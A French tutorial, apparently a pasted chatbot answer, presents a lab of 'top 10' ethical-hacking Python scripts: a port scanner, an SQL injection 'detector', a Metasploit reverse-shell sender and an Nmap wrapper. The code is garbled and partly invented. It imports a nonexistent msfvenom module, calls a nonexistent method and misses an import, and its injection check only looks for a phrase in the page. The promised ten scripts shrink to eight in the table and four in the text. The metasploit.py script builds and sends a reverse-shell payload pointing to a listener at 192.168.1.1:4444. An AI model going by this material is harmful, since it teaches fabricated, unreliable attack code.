# Lab complet en Python, HTML, Bootstrap et JavaScript avec le top 10 des scripts Python pour ethical hacking

## Introduction

Ce lab vous donne une introduction aux techniques d'ethical hacking et aux scripts Python pour ethical hacking. Il vous permet de mettre en pratique vos connaissances et de développer vos compétences.

## Prérequis

* Connaissances de base en informatique
* Connaissances de base en programmation

## Matériel

* Un ordinateur avec un système d'exploitation Windows, macOS ou Linux
* Un éditeur de texte ou un IDE (environnement de développement intégré)
* Une connexion Internet

## Étape 1 : Installation du matériel et des logiciels

1. Installez un environnement de développement Python, comme Anaconda ou Pythonista.
2. Installez un éditeur de texte ou un IDE, comme Visual Studio Code ou Sublime Text.

## Étape 2 : Installation des dépendances

1. Installez les dépendances pour les scripts Python, en exécutant la commande suivante :

Utilisez le code avec précaution. En savoir plus
pip install -r requirements.txt

Étape 3 : Lancement du lab
Ouvrez le fichier index.html dans votre navigateur Web.
Top 10 des scripts Python pour ethical hacking

# Tableau de synthèse

| Script | Langue | Fonctionnalité |
|---|---|---|
| portscanner.py | Python | Scanne les ports ouverts sur un serveur ou un appareil. |
| sqlmap.py | Python | Identifie et exploite les vulnérabilités SQL injection. |
| metasploit.py | Python | Utilise le framework Metasploit pour lancer des attaques contre des systèmes. |
| nmap.py | Python | Lance des scans réseau pour identifier les vulnérabilités. |
| nikto.py | Python | Lance des scans de vulnérabilités sur des sites Web. |
| owasp-zap.py | Python | Utilise l'outil OWASP ZAP pour identifier les vulnérabilités. |
| wpscan.py | Python | Identifie et exploite les vulnérabilités de WordPress. |
| john-the-ripper.py | Python | Craque les mots de passe en utilisant la force brute ou des dictionnaires. |

### Script : portscanner.py
Ce script scanne les ports ouverts sur un serveur ou un appareil.

```Python
import socket

def main():
    # Demander à l'utilisateur l'adresse IP ou le nom de domaine à scanner
    host = input("Adresse IP ou nom de domaine à scanner : ")

    # Créer un socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Scanner les ports de 1 à 65535
    for port in range(1, 65535):
        # Essayer de se connecter au port
        try:
            s.connect((host, port))
        except socket.error:
            # Le port est fermé
            pass
        else:
            # Le port est ouvert
            print("Port {} ouvert".format(port))

    s.close()

if __name__ == "__main__":
    main()
```

Utilisez le code avec précaution. En savoir plus
### Script : sqlmap.py
Ce script identifie et exploite les vulnérabilités SQL injection.

```Python
import requests

def main():
    # Demander à l'utilisateur l'adresse URL du site Web à scanner
    url = input("Adresse URL du site Web à scanner : ")

    # Créer une requête GET simple
    request = requests.get(url)

    # Analyser la réponse HTTP pour détecter les vulnérabilités SQL injection
    if "SQL injection" in request.text:
        print("Le site Web {} est vulnérable à SQL injection".format(url))
    else:
        print("Le site Web {} n'est pas vulnérable à SQL injection".format(url))

if __name__ == "__main__":
    main()
```

Utilisez le code avec précaution. En savoir plus

### Script : metasploit.py
Ce script utilise le framework Metasploit pour lancer des attaques contre des systèmes.

```Python
import msfvenom

def main():
    # Demander à l'utilisateur l'adresse IP ou le nom de domaine de la cible
    target = input("Adresse IP ou nom de domaine de la cible : ")

    # Générer un payload malveillant
    payload = msfvenom.payloads.linux.x64.shell_reverse_tcp(LHOST="192.168.1.1", LPORT=4444)

    # Envoyer le payload à la cible
    requests.post(target, data=payload)

if __name__ == "__main__":
    main()
```

Utilisez le code avec précaution. En savoir plus

### Script : nmap.py
Ce script lance des scans réseau pour identifier les vulnérabilités.

```python

import nmap

def main():
    # Demander à l'utilisateur l'adresse IP ou le nom de domaine de la cible
    target = input("Adresse IP ou nom de domaine de la cible : ")

    # Lancer un scan Nmap
    scan = nmap.PortScanner()
    scan.scan(target, "1-65535")

    # Afficher les résultats du scan
    for host in scan.all_hosts():
        for port in scan[host].get_open_ports():
            print("Port {} ouvert sur {} ({})".format(port, host, scan[host][port]["state"]))

if __name__ == "__main__":
    main()
```

Ce script utilise la bibliothèque nmap pour lancer un scan Nmap sur la cible spécifiée par l'utilisateur. Le scan analyse les ports de 1 à 65535. Les résultats du scan sont affichés sur la console.

Voici une explication des différentes sections du code :

La fonction main() est la fonction principale du script. Elle demande à l'utilisateur l'adresse IP ou le nom de domaine de la cible, puis lance le scan Nmap.
La fonction scan() de la bibliothèque nmap lance un scan Nmap sur la cible spécifiée.
La fonction get_open_ports() de la bibliothèque nmap renvoie une liste des ports ouverts sur la cible.
La boucle for itère sur les ports ouverts et affiche les informations sur chaque port.
Voici un exemple de sortie du script :
```
Adresse IP ou nom de domaine de la cible : 192.168.1.1

Port 22 ouvert sur 192.168.1.1 (open)
Port 80 ouvert sur 192.168.1.1 (open)
Port 443 ouvert sur 192.168.1.1 (open)
```
